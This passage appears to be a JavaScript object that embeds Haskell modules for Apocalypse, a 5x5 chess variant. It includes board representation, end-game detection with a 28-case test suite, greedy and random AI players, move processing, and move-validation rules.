		char2Cell '_'   = E

		{- | IO function to print a 'Cell' in a 'Board', which is printed as '|' and the char
		     representation of the 'Cell'.
		-}
		putCell         :: Cell -> IO()
		putCell c       = do putChar '|'
		                     putChar (cell2Char c)

		---Boards--------------------------------------------------------
		---A board is just a 2d (8x8) list of Cells

		-- | The representation of the 'Board' (which is 5x5).
		type Board      = [[Cell]]

		-- | Customize the read function for 'Board' to coorespond with the show function.
		instance {-# OVERLAPS #-}
		         Read Board where
		         readsPrec _ r = [(result, remainder)]
		                             where
		                             allLines = lines (dropWhile (isSpace) r)
		                             lss = take 6 allLines
		                             ls = tail lss
		                             rows = map (filter (/='|')) ls
		                             result = map (map char2Cell) rows
		                             remainder = unlines $ drop 6 allLines

		-- | Customized Show for 'Board' so it's more human-readable
		instance {-# OVERLAPS #-} Show Board where show b = board2Str b

		-- | The intial state of the board
		initBoard       :: GameState
		initBoard       = GameState Init 0 Init 0
		                  [ [WK, WP, WP, WP, WK],
		                    [WP, E , E , E , WP],
		                    [E , E , E , E , E ],
		                    [BP, E , E , E , BP],
		                    [BK, BP, BP, BP, BK] ]

		-- | Print out a row in a 'Board' in the for "|?|?|?|?|?|".
		putRow          :: [Cell] -> IO()
		putRow r        = do mapM_ putCell r
		                     putStr "|\\n"

		-- | return a row in a 'Board' in the for "|?|?|?|?|?|".
		row2Str        :: [Cell] -> String
		row2Str []     = []
		row2Str (x:xs) = "|" ++ show x ++ row2Str xs

		{- | IO function to print out a 'Board' in the form of:

		@
		 _ _ _ _ _
		|?|?|?|?|?|
		|?|?|?|?|?|
		|?|?|?|?|?|
		|?|?|?|?|?|
		|?|?|?|?|?|
		@
		Where the question marks are replaced with the appropriate 'Cell' character (see
		'cell2Char').
		-}
		putBoard        :: [[Cell]] -> IO()
		putBoard a      = do
		                    putStr " _ _ _ _ _\\n"
		                    mapM_ putRow a
		                    putStr ""

		-- | Return a string representation of a 'Board' in the same form as 'putBoard', above.
		board2Str         :: [[Cell]] -> String
		board2Str b       = " _ _ _ _ _\\n" ++ board2Str' b
		-- | Helper function for 'board2Str'.
		board2Str'        :: [[Cell]] -> String
		board2Str' []     = []
		board2Str' (x:xs) = row2Str x ++ "|\\n" ++ board2Str' xs

		-- | Return the 'Cell' at a point from a 'Board'.
		getFromBoard             :: [[a]] -> (Int,Int) -> a
		getFromBoard xs pt       = xs !! snd pt !! fst pt

		---Game state-------------------------------------------------------

		-- | Represents a Player (Black or White).
		data Player    = Black | White deriving (Eq, Show, Read)

		-- | Represents a Piece, which is slightly different from 'Cell' as a player can't be empty.
		data Piece     = BlackKnight | BlackPawn | WhiteKnight | WhitePawn deriving (Eq, Show, Read)

		-- | Given a 'Cell', return the corresponding 'Piece'.
		pieceOf        :: Cell -> Piece
		pieceOf  BK     = BlackKnight
		pieceOf  BP     = BlackPawn
		pieceOf  WK     = WhiteKnight
		pieceOf  WP     = WhitePawn

		-- | Given a 'Piece', return the corresponding 'Player'.
		playerOf            :: Piece -> Player
		playerOf BlackKnight = Black
		playerOf BlackPawn   = Black
		playerOf WhiteKnight = White
		playerOf WhitePawn   = White

		-- | Represents the type of move played in a 'GameState'.
		data Played = Played ((Int, Int), (Int, Int)) -- ^ A "normal" move.
		            | Passed                          -- ^ A (legal) pass.
		            | Goofed ((Int, Int), (Int, Int)) -- ^ An illegal move, penalty applied.
		--             | GoofedFromEmpty ((Int, Int), (Int, Int)) -- ^ An illegal move, penalty applied.
		--             | GoofedFromOther ((Int, Int), (Int, Int)) -- ^ An illegal move, penalty applied.
		--             | GoofedFromInvalid ((Int, Int), (Int, Int)) -- ^ An illegal move, penalty applied.
		            | Init                            -- ^ No one has moved yet.
		            | UpgradedPawn2Knight (Int,Int)   -- ^ A pawn reached the other side when <2 knights.
		            | PlacedPawn ((Int, Int), (Int, Int)) -- ^ A pawn that's been placed in any empty space after having reached the far end of the board.
		            | BadPlacedPawn ((Int, Int), (Int, Int)) -- ^ A strategy has attempted to do a pawn placement, but chose an invalid location.
		            | NullPlacedPawn -- ^ A strategy has attempted to do a pawn placement, but returned Nothing
		            | None -- ^ the legitimate 'pass' when the other player does a PlacedPawn
		              deriving (Eq, Show, Read)

		{- | Represents the current state of the game.  Contains:

		     * what each Player Played
		     * their penalties
		     * the state of the board.
		-}
		data GameState = GameState { blackPlay :: Played  -- ^ The black player's play type
		                           , blackPen  :: Int     -- ^ The black player's penalty
		                           , whitePlay :: Played  -- ^ The white player's play type
		                           , whitePen  :: Int     -- ^ The white player's penalty
		                           , theBoard  :: Board   -- ^ The actual board.
		                           } deriving (Eq)

		-- | Customize the print form of 'GameState'.
		instance Show (GameState) where
		         show g = ">>>\\n"
		                  ++ "(" ++ show (blackPlay g) ++ ", " ++ show (blackPen  g) ++ ")\\n"
		                  ++ "(" ++ show (whitePlay g) ++ ", " ++ show (whitePen  g) ++ ")\\n"
		                  ++ show (theBoard g)


		-- | Customize the read function for 'Board' to coorespond with the show function.
		instance Read GameState where
		    readsPrec _ r =
		      case readsPrec 0 (dropWhile (isSpace) (scanPastFlag r)) :: [((Played,Int),String)] of
		        (((bPlay,bPen),rest1):_) ->
		          case readsPrec 0 (dropWhile (isSpace) (tail rest1)) :: [((Played,Int),String)] of
		            (((wPlay,wPen),rest3):_) ->
		              case readsPrec 0 (tail rest3) :: [(Board,String)] of
		                ((board,rest5):_) ->
		                  [(GameState bPlay bPen wPlay wPen board, rest5)]
		                e3 -> []
		            e2 -> []
		        e1 -> []

		scanPastFlag :: String -> String
		scanPastFlag []                    = ""
		scanPastFlag ('>':'>':'>':'\\n':cs) = cs
		scanPastFlag (c:cs)                = scanPastFlag cs

		-- | The text version of a state for testing purposes.
		testState = "some garbage\\n\
		            \\>>>\\n\
		            \\(PlacedPawn ((0,0),(3,2)), 1)\\n\\
		            \\(None, 0)\\n\\
		            \\ _ _ _ _ _\\n\\
		            \\|_|_|_|_|X|\\n\\
		            \\|_|_|_|_|/|\\n\\
		            \\|_|_|_|+|_|\\n\\
		            \\|+|_|_|_|+|\\n\\
		            \\|#|_|+|+|#|"

		---Strategies-------------------------------------------------------

		{- | This type is used by 'Chooser' to tell the 'Chooser' strategy to generate either a
		     'Normal' move (source and destination) or a 'PawnPlacement' move (just a destination).
		-}
		data PlayType = Normal -- ^ The 'Chooser' should return a list of 2 (x,y) coordinates.
		              | PawnPlacement -- ^ The 'Chooser' should return a singleton list of (x,y) coordinates.
		               deriving Eq

		{- | This is the type for all player functions.  A player strategy function takes

		    1. a 'GameState' on which to base it's decision
		    2. 'PlayType', which may be 'Normal' to indicate that it must return both a source
		       and destination coordinate in the form [(a,b),(c,d)] where the letters must be
		       integers; or it may be 'PawnPlacement' to indicate that it must return just a
		       singlton list containing an empty cell in the 'Board'.
		    3. 'Player' which indicates that the strategy must work from the perspective of
		       'Black' or 'White'.

		    The return value can will be Just [(Int,Int)] with either one or two elements (see
		    point 2 above), or it may return Nothing to indicate a "pass".
		-}
		type Chooser = GameState -> PlayType -> Player -> IO (Maybe [(Int,Int)])`
	},
	hs4: {
		type: 'haskell',
		code: `
		module EndGame where

		import ApocTools

		-- | Checks for end of game
		isOver :: GameState -> Maybe(String)
		isOver gs
		    | pawnEnd /= Nothing = pawnEnd -- Look for winner due to one player with no pawns first
		    | penaltyEnd /= Nothing = penaltyEnd -- Look for winner due to one player with 2 penalties second
		    | passingEnd /= Nothing = passingEnd -- Look for winner due to both players passing last
		    | otherwise = Nothing
		    where
		        pawnEnd = noPawns gs
		        penaltyEnd = twoPenalty gs
		        passingEnd = doublePass gs

		-- | Check for player with no pawns
		noPawns :: GameState -> Maybe(String)
		noPawns gs
		    | blackPawn == 0 && whitePawn == 0 = findTieWinner gs
		    | blackPawn == 0 = Just "White wins! Black has no pawns."
		    | whitePawn == 0 = Just "Black wins! White has no pawns."
		    | otherwise = Nothing
		    where
		        whitePawn = countPawns White (theBoard gs)
		        blackPawn = countPawns Black (theBoard gs)

		-- | Check for two penalty points
		twoPenalty :: GameState -> Maybe(String)
		twoPenalty gs
		    | whitePenalty == 2 && blackPenalty == 2 = findTieWinner gs
		    | whitePenalty == 2 = Just "Black wins! White has 2 penalty points."
		    | blackPenalty == 2 = Just "White wins! Black has 2 penalty points."
		    | otherwise = Nothing
		    where
		        whitePenalty = whitePen gs
		        blackPenalty = blackPen gs

		-- | Check for both players passing
		doublePass :: GameState -> Maybe(String)
		doublePass gs
		    | whitePlayed == Passed && blackPlayed == Passed = findTieWinner gs
		    | otherwise = Nothing
		    where
		        whitePlayed = whitePlay gs
		        blackPlayed = blackPlay gs

		-- | Evaluate winner in tie case
		findTieWinner :: GameState -> Maybe(String)
		findTieWinner gs
		    | whitePawn > blackPawn = Just "White wins! White has more pawns than Black."
		    | blackPawn > whitePawn = Just "Black wins! Black has more pawns than White."
		    | whitePenalty > blackPenalty = Just "Black wins! White has more penalty points than Black."
		    | blackPenalty > whitePenalty = Just "White wins! Black has more penalty points than White."
		    | otherwise = Just "Tie game! Both players have the same number of pawns and penalty points."
		    where
		        whitePawn = countPawns White (theBoard gs)
		        blackPawn = countPawns Black (theBoard gs)
		        whitePenalty = whitePen gs
		        blackPenalty = blackPen gs

		-- | Counts the number of pawns a certain player has on the board
		countPawns :: Player -> Board -> Int
		countPawns player board
		    | player == White = length (filter (==WP) (foldr (++) [] board))
		    | player == Black = length (filter (==BP) (foldr (++) [] board))

		-- | Counts the number of pawns a certain player has on the board
		countKnights :: Player -> Board -> Int
		countKnights player board
		    | player == White = length (filter (==WK) (foldr (++) [] board))
		    | player == Black = length (filter (==BK) (foldr (++) [] board))`
	},
	hs5: {
		type: 'haskell',
		code: `
		module EndGameTests where

		import ApocTools
		import EndGame

		-- | Produces an array of Strings that contains the results of the tests with each index corresponding the test condition in main
		stringResults :: Int -> [Bool] -> [String]
		stringResults _ [] = []
		stringResults x (b:bs) = (prettyResults x b) : stringResults (x+1) bs

		-- | Converts a boolean that describes if the test results matches the expected result to a string with the test number and the result
		prettyResults :: Int -> Bool -> String
		prettyResults x True = "Test " ++ (show x) ++ ": " ++ "Pass"
		prettyResults x False = "Test " ++ (show x) ++ ": " ++ "Fail"

		-- | Runs all the different test cases through the testing function
		runEndGameTests :: [(GameState, Maybe(String))] -> [Bool]
		runEndGameTests arr = map gameStateTestResult arr

		-- | Tests if the EndGame produces the expected result for a given GameState
		gameStateTestResult :: (GameState, Maybe(String)) -> Bool
		gameStateTestResult (gs, expected)
		    | (isOver gs) == expected = True
		    | otherwise = False

		-- | Describes the tests run on the EndGame module and prints the results
		main = do
		    mapM_ (putStrLn.show) $ stringResults 1 (runEndGameTests gss)
		    where
		        -- All of the tests as an array of (GameState, Expected Result) tuples
		        gss = [
		                -- Test 1: Initial Board
		                ((GameState Init 0 Init 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Nothing),
		                
		                -- Test 2: No white pawns
		                ((GameState Init 0 Init 0 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! White has no pawns."),
		                
		                -- Test 3: No black pawns
		                ((GameState Init 0 Init 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "White wins! Black has no pawns."),
		                
		                -- Test 4: No pawns at all, equal penalties
		                ((GameState Init 0 Init 0 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 5: No pawns at all, black has more penalties
		                ((GameState Init 1 Init 0 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "White wins! Black has more penalty points than White."),
		                
		                -- Test 6: No pawns at all, white has more penalties
		                ((GameState Init 0 Init 1 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "Black wins! White has more penalty points than Black."),
		                
		                -- Test 7: No pawns at all, black has 2 penalties
		                ((GameState Init 2 Init 0 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "White wins! Black has more penalty points than White."),
		                
		                -- Test 8: No pawns at all, white has 2 penalties
		                ((GameState Init 0 Init 2 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "Black wins! White has more penalty points than Black."),
		                
		                -- Test 9: No pawns at all, both have 2 penalties
		                ((GameState Init 2 Init 2 [
		                [WK, E , E , E , WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, E , E , E , BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 10: Black has 2 penalties
		                ((GameState Init 2 Init 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! Black has 2 penalty points."),
		                
		                -- Test 11: White has 2 penalties
		                ((GameState Init 0 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! White has 2 penalty points."),
		                
		                -- Test 12: Both have 2 penalties, same number of pawns
		                ((GameState Init 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 13: Both have 2 penalties, black has more pawns
		                ((GameState Init 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! Black has more pawns than White."),
		                
		                -- Test 14: Both have 2 penalties, white has more pawns
		                ((GameState Init 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! White has more pawns than Black."),
		                
		                -- Test 15: Black passed
		                ((GameState Passed 0 Init 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Nothing),
		                
		                -- Test 16: White passed
		                ((GameState Init 0 Passed 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Nothing),
		                
		                -- Test 17: Both passed, same number of pawns
		                ((GameState Passed 0 Passed 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 18: Both passed, black has more pawns
		                ((GameState Passed 0 Passed 0 [
		                [WK, WP, WP, WP, WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! Black has more pawns than White."),
		                
		                -- Test 19: Both passed, white has more pawns
		                ((GameState Passed 0 Passed 0 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! White has more pawns than Black."),
		                
		                -- Test 20: Both have two penalties, both passed, same number of pawns
		                ((GameState Passed 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 21: Both have two penalties, both passed, black has more pawns
		                ((GameState Passed 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! Black has more pawns than White."),
		                
		                -- Test 22: Both have two penalties, both passed, white has more pawns
		                ((GameState Passed 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! White has more pawns than Black."),
		                
		                -- Test 23: Both have two penalties, black passed, same number of pawns
		                ((GameState Passed 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 24: Both have two penalties, black passed, black has more pawns
		                ((GameState Passed 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! Black has more pawns than White."),
		                
		                -- Test 25: Both have two penalties, black passed, white has more pawns
		                ((GameState Passed 2 Init 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! White has more pawns than Black."),
		                
		                -- Test 26: Both have two penalties, white passed, same number of pawns
		                ((GameState Init 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Tie game! Both players have the same number of pawns and penalty points."),
		                
		                -- Test 27: Both have two penalties, white passed, black has more pawns
		                ((GameState Init 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BP, E , E , E , BP],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "Black wins! Black has more pawns than White."),
		                
		                -- Test 28: Both have two penalties, white passed, white has more pawns
		                ((GameState Init 2 Passed 2 [
		                [WK, WP, WP, WP, WK],
		                [WP, E , E , E , WP],
		                [E , E , E , E , E ],
		                [E , E , E , E , E ],
		                [BK, BP, BP, BP, BK]]),
		                
		                Just "White wins! White has more pawns than Black.")
		            ]`
	},
	hs6: {
		type: 'haskell',
		code: `
		module GreedyAI where

		import Data.Maybe (fromJust, isNothing)
		import ApocTools
		import Utils
		import Rules
		import EndGame
		import System.Random

		-- | Defines a data structure that allows us to store a move's coords and it's "point" weighting
		data GreedyMoveAndPoints = GreedyMoveAndPoints {
		    src :: (Int, Int),
		    dest :: (Int, Int), 
		    points :: Int
		}


		-- | Given a Cell, returns how many greedy points its worth
		getGreedyPoints :: Cell -> Int
		getGreedyPoints WK = 2
		getGreedyPoints BK = 2
		getGreedyPoints WP = 1
		getGreedyPoints BP = 1
		getGreedyPoints E  = 0

		-- | Returns a list of the most greedy moves on the board
		getMostGreedy :: Board -> [((Int, Int), (Int, Int))] -> Player -> [GreedyMoveAndPoints]
		getMostGreedy _ [] _ = [GreedyMoveAndPoints (0, 0) (0, 0) (-1)]
		getMostGreedy board (x:xs) player =
		    if (thispoints > nextPoints) then -- This has more points, return just this
		        [GreedyMoveAndPoints src dest thispoints]
		    else
		        if (thispoints == nextPoints) then -- Same amount of points, add to the list
		            (GreedyMoveAndPoints src dest thispoints):next
		        else -- Less than the next, return next 
		            next

		    where
		        src         = fst x
		        dest        = snd x
		        destCell    = getFromBoard board dest
		        thispoints  = getGreedyPoints destCell
		        next        = (getMostGreedy board xs player)
		        nextPoints  = points (next!!0)


		-- | Tries to find a move that can bring a pawn to the last rank
		lookingForUpgrade :: Board -> (Int, Int) -> Player -> Maybe (((Int, Int), (Int, Int)))
		lookingForUpgrade _ (0, 5) _ = Nothing
		lookingForUpgrade board (x, y) player =
		    if (cell == BP && player == Black && y == 1 && validMove board (x, y) (x, y-1) player) then Just ((x, y), (x, y-1)) -- We can upgrade this black pawn
		    else 
		        if (cell == WP && player == White && y == 3 && validMove board (x, y) (x, y+1) player) then Just ((x, y), (x, y+1)) -- We can upgrade this white pawn
		        else lookingForUpgrade board newCoord player -- Try the next coord

		    where 
		        newCoord = (if x == 4 then 0 else x+1, if x == 4 then y+1 else y)
		        cell = getFromBoard board (x, y)


		-- | Entry point of the Greedy strategy
		greedyMove                  :: Chooser
		greedyMove gs Normal player = do
		    possible <- getPossibleMoves board (0, 0) player

		    if length possible == 0 then do
		        -- No possible moves, pass
		        return Nothing
		    else do
		        gen <- newStdGen
		        let shouldGreedy = fst (randomR (0, 9) gen) :: Int

		        let pawnUpgrade = if (pawnAmt > 1 && knightAmt < 2) then lookingForUpgrade board (0, 0) player else Nothing

		        if isNothing pawnUpgrade == False then do
		            -- Upgrade the pawn
		            let nonJustPawn = fromJust pawnUpgrade
		            return (Just [fst nonJustPawn, snd nonJustPawn])
		        else do
		            if (shouldGreedy > 0) then do
		                -- Choose the greedy move 90% of the time

		                let greedy = getMostGreedy board possible player
		                let mostPoints = points (greedy!!0)

		                -- Choose a random greedy move from the best moves
		                gen <- newStdGen
		                let randIndex = fst (randomR (0, length greedy-1) gen) :: Int
		                return (Just [src (greedy!!randIndex), dest (greedy!!randIndex)])
		            else do
		                -- Choose a random move 10% of the time (to avoid infinite loops)
		                gen <- newStdGen
		                let randIndex = fst (randomR (0, length possible-1) gen) :: Int
		                return (Just [fst (possible!!randIndex), snd (possible!!randIndex)])

		    where
		        board = (theBoard gs)
		        pawnAmt = countPawns player board
		        knightAmt = countKnights player board


		greedyMove gs PawnPlacement player = do
		    -- Get random pawn placement move
		    emptyCoords <- getAllEmptyCoords (theBoard gs) (0, 0)

		    gen <- newStdGen
		    let randIndex = fst (randomR (0, length emptyCoords-1) gen) :: Int

		    -- There is guaranteed to be at least one empty space, so we don't need to handle that
		    return (Just [(emptyCoords!!randIndex)])`
	},
	hs7: {
		type: 'haskell',
		code: `
		module Moves where

		import ApocTools
		import Utils

		-- | Given a GameState with two unperformed moves, performs the valid moves
		move :: GameState -> GameState
		move gs
		    | (isPlayed $ whitePlay gs) && (isPlayed $ blackPlay gs)    = processBoth gs
		    | isPlayed $ whitePlay gs                                   = processSingle White gs
		    | isPlayed $ blackPlay gs                                   = processSingle Black gs
		    | otherwise                                                 = gs

		-- | Given two unperformed valid moves in a GameState, executes the moves on the board and returns the new GameSate
		processBoth :: GameState -> GameState
		processBoth gs
		    | whiteSource == blackDest  && blackSource == whiteDest             = swap
		    | blackDest == whiteSource                                          = blackDestToWhiteSrc
		    | whiteDest == blackSource                                          = whiteDestToBlackSrc
		    | whiteDest == blackDest    && blPiece == BP    && whPiece == WP    = clash
		    | whiteDest == blackDest    && blPiece == BK    && whPiece == WK    = clash
		    | whiteDest == blackDest    && blPiece == BK    && whPiece == WP    = whitePawnKill
		    | whiteDest == blackDest    && blPiece == BP    && whPiece == WK    = blackPawnKill
		    | otherwise = moveBoth
		    where
		        board          = theBoard gs
		        state          = GameState (blackPlay gs) (blackPen gs) (whitePlay gs) (whitePen gs)
		        whiteSource    = fst $ justCord $ whitePlay gs
		        whiteDest      = snd $ justCord $ whitePlay gs
		        blackSource    = fst $ justCord $ blackPlay gs
		        blackDest      = snd $ justCord $ blackPlay gs
		        whPiece        = getFromBoard board whiteSource
		        blPiece        = getFromBoard board blackSource
		        blPlay         = blackPlay gs
		        whPlay         = whitePlay gs

		        -- If the piece is moving to the origin of the other piece that is moving, we ensure that we preserve the piece types and only clear the proper origin
		        blackDestToWhiteSrc   = state $ replace2 (replace2 (replace2 board blackSource E) whiteDest whPiece) blackDest blPiece
		        whiteDestToBlackSrc   = state $ replace2 (replace2 (replace2 board whiteSource E) blackDest blPiece) whiteDest whPiece

		        swap           = state $ swapPieces board blackDest whiteDest blPiece whPiece
		        clash          = state $ allEmpty board whiteSource blackSource
		        moveBoth       = state $ movePiece (movePiece board whPlay) blPlay
		        whitePawnKill  = state $ replace2 (replace2 (replace2 board whiteSource E) blackSource E) blackDest BK
		        blackPawnKill  = state $ replace2 (replace2 (replace2 board whiteSource E) blackSource E) whiteDest WK

		-- | Given a Player and GameState with a Played move for that player, performs the move and returns the new GameState
		processSingle :: Player -> GameState -> GameState
		processSingle p gs
		    | p == White  = state $ movePiece (theBoard gs) (whitePlay gs)
		    | p == Black  = state $ movePiece (theBoard gs) (blackPlay gs)
		    where
		        state = GameState (blackPlay gs) (blackPen gs) (whitePlay gs) (whitePen gs)
		         
		-- | Performs a given Played move on the Board and returns the new GameState
		movePiece :: Board -> Played -> Board
		movePiece board (Played (sourceCord, destCord)) = replace2 (replace2 board sourceCord E) destCord sourcePiece
		    where
		        sourcePiece = getFromBoard board (sourceCord)

		-- | Given a Board and two piece coords and their Cell types, swaps the two pieces and returns the new state of the Board
		swapPieces :: Board -> (Int, Int) -> (Int, Int) -> Cell -> Cell -> Board
		swapPieces board (blCoord) (whCoord) blPiece whPiece = replace2 (replace2 board blCoord blPiece) whCoord whPiece

		-- | Given a Board and two coords, removes the pieces on both tiles and returns the new Board
		allEmpty :: Board -> (Int, Int) -> (Int, Int) -> Board
		allEmpty board cord1 cord2 = replace2 (replace2 board cord1 E) cord2 E

		-- | Given a Played data type, returns the source and destination tuples specifying the move coords
		justCord :: Played -> ((Int,Int),(Int,Int))
		justCord (Played (src, dest)) = (src, dest)

		-- | Checks whether a Played data type is of a Played state
		isPlayed :: Played -> Bool
		isPlayed (Played((_,_),(_,_)))    = True
		isPlayed x                        = False

		-- | Moves a given upgraded piece from the given source coord to the dest coord on the board and returns it
		moveUpgradePiece :: Board -> ((Int,Int),(Int,Int)) -> Board
		moveUpgradePiece board move = (replace2 (replace2 board src E) dest srcPiece)
		    where
		        src = fst move
		        dest = snd move
		        srcPiece = getFromBoard board src`
	},
	hs8: {
		type: 'haskell',
		code: `
		module RandomAI where

		import ApocTools
		import Utils
		import Rules
		import System.Random

		-- | Random Move Entry Point
		randomMove                  :: Chooser
		randomMove gs Normal player = do
		    possible <- getPossibleMoves (theBoard gs) (0, 0) player

		    if length possible == 0 then do
		        -- No possible moves, pass
		        return Nothing
		    else do
		        gen <- newStdGen
		        let randIndex = fst (randomR (0, length possible-1) gen)
		        return (Just [fst (possible!!randIndex), snd (possible!!randIndex)])


		randomMove gs PawnPlacement player = do
		    emptyCoords <- getAllEmptyCoords (theBoard gs) (0, 0)

		    gen <- newStdGen
		    let randIndex = fst (randomR (0, length emptyCoords-1) gen)

		    -- There is guaranteed to be at least one empty space, so we don't need to handle that
		    return (Just [(emptyCoords!!randIndex)])`
	},
	hs9: {
		type: 'haskell',
		code: `
		module Rules where

		import Data.Maybe (fromJust, isNothing)
		import ApocTools

		-- | Returns a bool as to whether the player owns the piece at the tile
		ownsPiece :: [[Cell]] -> (Int, Int) -> Player -> Bool
		ownsPiece board (srcX, srcY) player
		    | cell /= E && playerOf (pieceOf (cell)) == player = True -- Note: pieceOf doesn't have a case for E :(
		    | otherwise = False
		    where
		        cell = getFromBoard board (srcX, srcY)

		-- | Returns a bool as to whether the pawn move is valid directionally
		validPawnDirection :: [[Cell]] -> (Int, Int) -> (Int, Int) -> Player -> Bool
		validPawnDirection board (srcX, srcY) (destX, destY) player
		    | abs deltaY > 1 = False -- They can only move 1 forward
		    | deltaX /= 0 && abs deltaX /= 1 = False -- They can only move 0 sideways or 1 sideways
		    | player == White && deltaY <= 0 = False -- Ensure they are moving in the right direction (if it is White, move down (larger index), else up)
		    | player == Black && deltaY >= 0 = False
		    -- Now we know that they are moving 1 forward and either 0 or 1 tiles sideways
		    | deltaX == 0 && abs deltaY == 1 && destCell == E = True -- They are moving forward into an empty cell
		    | deltaX == 0 && abs deltaY == 1 && destCell /= E = False -- They are moving forward into a opponent
		    -- They must be moving diagonaly to be valid now
		    | destCell == E = False -- You can't move diagonally to an empty cell
		    | playerOf (pieceOf (destCell)) /= player = True -- Moving diagonally to a cell that is the not the player
		    | otherwise = False
		    where 
		        srcCell = getFromBoard board (srcX, srcY)
		        destCell = getFromBoard board (destX, destY)
		        deltaX = destX - srcX
		        deltaY = destY - srcY

		-- | Returns a bool as to whether the knight move is valid directionally
		validKnightDirection :: [[Cell]] -> (Int, Int) -> (Int, Int) -> Player -> Bool
		validKnightDirection board (srcX, srcY) (destX, destY) player
		    | abs deltaX == 1 && abs deltaY == 2 = True
		    | abs deltaX == 2 && abs deltaY == 1 = True
		    | otherwise = False
		    where
		        deltaX = destX - srcX
		        deltaY = destY - srcY

		-- | Returns bool as to whether the bounds are proper for a given move
		validMoveBounds :: (Int, Int) -> (Int, Int) -> Bool
		validMoveBounds (srcX, srcY) (destX, destY)
		    | srcX < 0 || srcX > 4 = False
